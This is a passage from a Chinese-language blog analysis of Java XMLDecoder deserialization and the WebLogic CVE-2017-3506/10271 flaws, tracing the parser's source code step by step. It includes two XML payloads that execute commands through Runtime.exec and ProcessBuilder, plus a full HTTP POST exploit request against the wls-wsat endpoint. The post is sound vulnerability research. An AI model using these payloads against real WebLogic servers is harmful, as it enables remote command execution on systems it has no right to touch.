<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">this</span>.field != <span class="literal">null</span>) || (<span class="built_in">this</span>.idref != <span class="literal">null</span>)) &#123;</span><br><span class="line">        getValueObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着下一个标签<void property="name">，<code>VoidElementHandler</code>由于没有<code>addAttribute</code>方法，调用父类的<code>addAttribute</code>方法，即<code>ObjectElementHandler#addAttribute</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">addAttribute</span><span class="params">(String name, String value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.equals(<span class="string">&quot;idref&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.idref = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;field&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.field = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;index&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.index = Integer.valueOf(value);</span><br><span class="line">        addArgument(<span class="built_in">this</span>.index); <span class="comment">// hack for compatibility</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;property&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.property = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;method&quot;</span>)) &#123; <span class="comment">// NON-NLS: the attribute name</span></span><br><span class="line">        <span class="built_in">this</span>.method = value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.addAttribute(name, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>处理器的startElement方法同理，调用父类的<code>ObjectElementHandler.startElement()</code>，不过依然判断为false不执行任何操作。</p>
<p>然后是<string>example</string>标签。由于不是属性-值这种。直接调用处理器startElement方法。与上面同理由于没有改方法调用父类的<code>ElementHandler.startElement()</code>，方法为空啥也没干。</p>
<p>由于<string>example</string>该标签有开始标签<string>，还有结束标签</String>，所以下一次在XMLDocumentFragmentScannerImpl#next()中，会走进这一个case代码块，会扫描结束标签。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> SCANNER_STATE_END_ELEMENT_TAG :&#123;</span><br><span class="line">    <span class="keyword">if</span>(fEmptyElement)&#123;</span><br><span class="line">        fEmptyElement = <span class="literal">false</span>;</span><br><span class="line">        setScannerState(SCANNER_STATE_CONTENT);</span><br><span class="line">        <span class="keyword">return</span> (fMarkupDepth == <span class="number">0</span> &amp;&amp; elementDepthIsZeroHook() ) ? XMLEvent.END_ELEMENT : XMLEvent.END_ELEMENT ;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(scanEndElement() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (elementDepthIsZeroHook()) &#123;</span><br><span class="line">            <span class="keyword">return</span> XMLEvent.END_ELEMENT ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    setScannerState(SCANNER_STATE_CONTENT);</span><br><span class="line">    <span class="keyword">return</span> XMLEvent.END_ELEMENT ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过scanEndElement()方法会一直调用到DocumentHandler#endElement方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">endElement</span><span class="params">(String uri, String localName, String qName)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.handler.endElement();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (RuntimeException exception) &#123;</span><br><span class="line">        handleException(exception);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.handler = <span class="built_in">this</span>.handler.getParent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会去调用<code>StringElementHandler</code>的<code>startElement()</code>方法，由于没有所以调到父类<code>ElementHandler#startElement()</code>方法。</p>
<p>首先通过<code>getValueObject</code>方法获取当前元素的值对象。该对象的<code>value</code>属性等于我们开始和结束标签之间的值，即<string>example</string>中间的值example。然后会取出这个<code>value</code>值，作为参数传给 <code>this.parent.addArgument</code>方法，也就是上一个标签<code>VoidElementHandler</code>的<code>addArgument</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">endElement</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// do nothing if no value returned</span></span><br><span class="line">    <span class="type">ValueObject</span> <span class="variable">value</span> <span class="operator">=</span> getValueObject();</span><br><span class="line">    <span class="keyword">if</span> (!value.isVoid()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.id != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.owner.setVariable(<span class="built_in">this</span>.id, value.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (isArgument()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.parent.addArgument(value.getValue());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.owner.addObject(value.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后把值放到arguments这个ArrayList里面。</p>
<p><img src="/./images/image-20240912034654905.png" alt="image-20240912034654905"></p>
<p>接着，要处理的标签是</void>，所以和上面流程类似，处理器是VoidElementHandler，调用的是父类的父类的父类ElementHandler#endElement方法，然后调用到父类的父类NewElementHandler#getValueObject方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NewElementHandler#getValueObject</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title function_">getValueObject</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.arguments != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.value = getValueObject(<span class="built_in">this</span>.type, <span class="built_in">this</span>.arguments.toArray());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            getOwner().handleException(exception);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.arguments = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ObjectElementHandler#getValueObject</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> ValueObject <span class="title function_">getValueObject</span><span class="params">(Class&lt;?&gt; type, Object[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.field != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ValueObjectImpl.create(FieldElementHandler.getFieldValue(getContextBean(), <span class="built_in">this</span>.field));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.idref != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ValueObjectImpl.create(getVariable(<span class="built_in">this</span>.idref));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> getContextBean();</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.index != <span class="literal">null</span>) &#123;</span><br><span class="line">        name = (args.length == <span class="number">2</span>)</span><br><span class="line">                ? PropertyElementHandler.SETTER</span><br><span class="line">                : PropertyElementHandler.GETTER;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.property != <span class="literal">null</span>) &#123;</span><br><span class="line">        name = (args.length == <span class="number">1</span>)</span><br><span class="line">                ? PropertyElementHandler.SETTER</span><br><span class="line">                : PropertyElementHandler.GETTER;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="built_in">this</span>.property.length()) &#123;</span><br><span class="line">            name += <span class="built_in">this</span>.property.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(ENGLISH) + <span class="built_in">this</span>.property.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        name = (<span class="built_in">this</span>.method != <span class="literal">null</span>) &amp;&amp; (<span class="number">0</span> &lt; <span class="built_in">this</span>.method.length())</span><br><span class="line">                ? <span class="built_in">this</span>.method</span><br><span class="line">                : <span class="string">&quot;new&quot;</span>; <span class="comment">// NON-NLS: the constructor marker</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Expression</span>(bean, name, args);</span><br><span class="line">    <span class="keyword">return</span> ValueObjectImpl.create(expression.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建一个 <code>Expression</code> 对象，传入上下文 bean、方法名和参数，然后调用 <code>expression.getValue()</code> 获取结果，并用 <code>ValueObjectImpl.create</code> 包装成 <code>ValueObject</code> 返回。这里就是把我们解析出来的类、属性、值一起包装到一个类中。</p>
<p><img src="/./images/image-20240912233738340.png" alt="image-20240912233738340"></p>
<p>然后在<code>Expression#getValue()</code>方法，里面会执行对应的方法，首先执行的对应类的无参构造函数，第二次执行的才是<code>setName</code>方法。一直到<code>MethodUtil#invoke</code>方法里面。</p>
<p><img src="/./images/image-20240912235146168.png" alt="image-20240912235146168"></p>
<h3 id="攻击Demo"><a href="#攻击Demo" class="headerlink" title="攻击Demo"></a>攻击Demo</h3><p>给出两种常见攻击demo。如果反序列化的xml文件是如下代码，就会触发命令执行。触发原理和上面流程差不多，也是在相同的地方反射调用方法。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_65&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getRuntime&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Runtime&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;exec&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_65&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="CVE-2017-3506-CVE-2017-10271"><a href="#CVE-2017-3506-CVE-2017-10271" class="headerlink" title="CVE-2017-3506&amp;CVE-2017-10271"></a>CVE-2017-3506&amp;CVE-2017-10271</h3><h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
<p>CVE-2017-3506和CVE-2017-10271原理是一样的，只是CVE-2017-3506的修复补丁是禁用object标签，所以随后出现了CVE-2017-10271。不使用object标签的payload即可。</p>
<h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>参考上面T3反序列化的环境。</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>存在 WLS-WebServices 的组件的Weblogic版本。</p>
<h4 id="漏洞payload"><a href="#漏洞payload" class="headerlink" title="漏洞payload"></a>漏洞payload</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.147.131:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 589</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getRuntime&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Runtime&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;exec&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>touch /tmp/CVE-2017-10271<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./images/image-20240914145537449.png" alt="image-20240914145537449"></p>
<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>我们从<code>WLSServletAdapter#handle</code>方法开始调试，在此之前是一些服务器对请求预处理，安全性检查之类的操作。这里会判断我们的请求方法，如何是GET型或者HEAD型，就会进去if语句进行处理。我们发送的请求包是POST类型，所以进入<code>super.handle(var1, var2, var3);</code></p>
<p><img src="/./images/image-20240915011547329.png" alt="image-20240915011547329"></p>
<p>一直到<code>HttpAdapter#handle</code>，这里又会判断请求类型，然后因为判断不通过跳到<code>tk.handle(connection);</code>，这是一个内部类方法<code>HttpAdapter$HttpToolkit#handle</code>。</p>
<p><img src="/./images/image-20240915013453656.png" alt="image-20240915013453656"></p>
<p>这里我们可以大致分成两个部分，首先是解码入站消息，将结果存储在 <code>packet</code> 对象中。然后是调用 <code>this.head.process</code> 方法处理<code>packet</code>中的消息，并且将结果存储回 <code>packet</code> 中。</p>
<p><img src="/./images/image-20240915015959451.png" alt="image-20240915015959451"></p>
<p>我们先跟第一部分，解码入站信息。跟进到<code>HttpAdapter#decodePacket</code>，这个方法作用是解码 HTTP 请求并生成一个包含请求信息的 <code>Packet</code> 对象。</p>
<p><img src="/./images/image-20240915020449544.png" alt="image-20240915020449544"></p>
<p>主要是这一行代码<code>InputStream in = con.getInput();</code>，我们发送的POST数据包就在in中。</p>
<p><img src="/./images/image-20240915021252447.png" alt="image-20240915021252447"></p>
<p>跟到<code>codec.decode(in, ct, packet);</code>进入<code>SOAPBindingCodec#decode</code>中。</p>
<p><img src="/./images/image-20240915022335176.png" alt="image-20240915022335176"></p>
<p>进入<code>StreamSOAPCodec#decode</code>方法，从中进入重载的decode方法。</p>
<p><img src="/./images/image-20240915023513509.png" alt="image-20240915023513509"></p>
<p><code>packet.setMessage(this.decode(reader, att));</code>中的重载<code>decode</code>方法主要是解析 SOAP 消息的 XML 内容，并将其封装到 <code>Message</code> 对象。然后用<code>packet</code>的<code>setMessage</code>方法将这个封装后的<code>Message</code>对象赋值给<code>packet</code>，然后返回这个<code>packet</code>对象。</p>
<p>回到<code>HttpAdapter#handle</code>方法中，接着我们看一下处理入站消息的部分。跟进<code>packet = this.head.process(packet, con.getWebServiceContextDelegate(), packet.transportBackChannel);</code>，即来到<code>WSEndpointImpl$2#process中(WSEndpointImpl$2</code>是<code>WSEndpointImpl</code>类中的第二个匿名类)，前面是对<code>request</code>的属性赋值。主要关注对<code>request</code>处理的地方，即<code>request</code>作为参数的地方，因为我们的<code>payload</code>在里面。所以我们可以关注到<code>fiber.runSync(this.tube, request);</code></p>
<p><img src="/./images/image-20240915031202135.png" alt="image-20240915031202135"></p>
<p>把带有<code>payload</code>的<code>request</code>入站请求赋值给当前<code>Fiber</code>的<code>packet</code>属性，在调用当前<code>Fiber</code>的<code>doRun</code>方法后就返回这个<code>packet</code>属性。我们跟一下<code>doRun</code>方法。</p>
<p><img src="/./images/image-20240915032454360.png" alt="image-20240915032454360"></p>
<p>从<code>doRun</code>方法经过<code>_doRun</code>和<code>__doRun</code>之后，在<code>__doRun</code>经过几次循环调用<code>readHeaderOld</code>方法来到<code>WorkContextTube#readHeaderOld</code>。</p>
<p>这个方法会从头部列表中获取特定头部 <code>WorkAreaConstants.WORK_AREA_HEADER</code>。如果头部不为 <code>null</code>，调用 <code>readHeaderOld</code> 方法处理，并设置 <code>isUseOldFormat</code> 标志为 <code>true</code>。跟进readHeaderOld方法中。</p>
<p><img src="/./images/image-20240915034341315.png" alt="image-20240915034341315"></p>
<p>首先使用 <code>XMLStreamReader</code> 对象读取头部的 XML 内容，并跳过初始的两个标签，以便进入实际数据部分。接着，创建一个 <code>XMLStreamReaderToXMLStreamWriter</code> 对象，将读取到的 XML 内容桥接到一个 <code>XMLStreamWriter</code>，并将输出写入到 <code>ByteArrayOutputStream</code> 中，生成一个字节流。然后，方法通过 <code>ByteArrayInputStream</code> 将字节流转换为输入流，并创建一个 <code>WorkContextXmlInputAdapter</code> 适配器对象。最后，通过调用 <code>this.receive(var6)</code> 方法将适配器传递给接收方法进行处理。</p>
<p><img src="/./images/image-20240915034710733.png" alt="image-20240915034710733"></p>
<p>此时var4获取的就是我们构造的xmlpayload</p>
<p><img src="/./images/image-20240915035830886.png" alt="image-20240915035830886"></p>
<p>var6是一个<code>WorkContextXmlInputAdapter</code> 对象，该对象初始化会new一个XMLDecoder，并且给xmlDecoder的初始化参数是var4的字节数组流。</p>
<p><img src="/./images/image-20240915040156452.png" alt="image-20240915040156452"></p>
<p>这么一个要处理恶意payloaf字节流的XMLDecoder，只要调用了readObject方法，就会触发XMLDecoder反序列化漏洞。</p>
<p>我们继续跟进WorkContextServerTube#receive，使用 <code>WorkContextEntryImpl</code> 类的静态方法 <code>readEntry</code> 来读取并解析传入的 <code>var1</code> 对象。</p>
<p><img src="/./images/image-20240915041157771.png" alt="image-20240915041157771"></p>
<p>从一个数据输入流中读取一个 UTF-8 编码的字符串，并将其赋值给变量 <code>var1</code></p>
<p><img src="/./images/image-20240915041450037.png" alt="image-20240915041450037"></p>
<p>进入该方法后，就会看到这里调用了xmlDecoder的readObject方法。漏洞由此而来。</p>
<p><img src="/./images/image-20240915041556373.png" alt="image-20240915041556373"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">CVE-2015-4852 WebLogic T3 反序列化分析 | Drunkbaby’s Blog (drun1baby.top)</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/FymyW3LDeg5gqIcOxawzig">Weblogic T3协议反序列化漏洞分析（上）</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Kr-JDijPCs7u3mZXcRwe9g">Weblogic安全漫谈(一)</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic"><span class="toc-number">1.</span> <span class="toc-text">Weblogic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3"><span class="toc-number">1.2.</span> <span class="toc-text">T3协议相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">1.2.1.</span> <span class="toc-text">CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">漏洞影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BA%A4%E4%BA%92"><span class="toc-number">1.2.1.2.1.</span> <span class="toc-text">第一次交互</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BA%A4%E4%BA%92"><span class="toc-number">1.2.1.2.2.</span> <span class="toc-text">第二次交互</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMLDecoder%E7%9B%B8%E5%85%B3"><span class="toc-number">1.3.</span> <span class="toc-text">XMLDecoder相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLEncoder-%E5%92%8C-XMLDecoder"><span class="toc-number">1.3.1.</span> <span class="toc-text">XMLEncoder 和 XMLDecoder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLEncoder"><span 